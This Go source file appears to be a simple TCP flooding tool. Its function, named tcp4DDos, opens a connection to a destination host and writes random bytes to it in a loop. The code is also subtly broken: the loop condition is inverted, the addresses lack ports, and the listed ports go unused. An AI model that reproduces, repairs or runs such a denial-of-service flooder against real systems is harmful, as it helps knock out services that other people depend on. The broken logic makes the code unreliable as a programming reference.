package main

import (
	"crypto/rand"
	"net"
)

var (
	destination = "127.0.0.1"
	ports       = []int{80, 53, 8080}
	source      = []string{"127.0.0.1", "192.168.0.1"}
	dataSize    = 32
)

func GenRandomBytes(size uint) (blk []byte, err error) {
	blk = make([]byte, size)
	_, err = rand.Read(blk)
	return
}

func tcp4DDos(source *net.TCPAddr, destination *net.TCPAddr, size uint) {
	for conn, err := net.DialTCP("tcp", source, destination); err != nil; {
		data, _ := GenRandomBytes(size)
		conn.Write(data)
	}
}

func main() {
	source, _ := net.ResolveTCPAddr("tcp4", source[0])
	destination, _ := net.ResolveTCPAddr("tcp4", destination)

	tcp4DDos(source, destination, uint(dataSize))
}
